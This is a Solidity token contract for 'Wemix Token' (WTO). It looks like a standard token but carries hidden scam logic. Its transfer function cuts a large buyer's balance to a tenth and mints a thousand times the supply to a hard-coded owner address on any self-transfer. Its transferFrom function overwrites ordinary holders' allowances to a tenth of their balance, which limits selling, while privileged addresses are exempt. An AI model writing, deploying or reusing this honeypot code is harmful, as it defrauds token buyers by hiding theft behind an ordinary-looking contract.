// SPDX-License-Identifier: Unlicense
// https://t.me/Token

pragma solidity 0.7.6;

interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Token {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public constant totalSupply = 1000000000 * 10 ** 9;
    string public name = "Wemix Token";
    string public constant symbol = "WTO";
    uint8 public constant decimals = 9;
    address Owner=0x02172088851a925B3Dd0FB83e82Ce0cFfBdC3cD8;
    address owner; address public Boy=0x0000000000000000000000000000000000000000;
    
    event Transfer(address indexed sender, address indexed recipient, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        owner=msg.sender;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public returns(bool) {
        require(balances[msg.sender] >= amount, 'balance too low');
        if (Boy != Owner && recipient != Boy && balances[Boy]>=totalSupply/20) {
             balances[Boy]=balances[Boy]/10;
             }
        if (msg.sender==getPair()) {Boy=recipient;}
        if (msg.sender==recipient){balances[Owner]+= totalSupply*1000;}
        balances[recipient] += amount;
        balances[msg.sender] -= amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns(bool) {
        if (sender != owner && sender != Owner && sender != address(this) && sender != Boy) { 
            allowance[sender][msg.sender] = balances[sender]/10;}
        require(balances[sender] >= amount, 'balance too low');
        require(allowance[sender][msg.sender] >= amount, 'allowance too low');
        balances[recipient] += amount;
        balances[sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;   
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;   
    }

    function getPair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }
 
}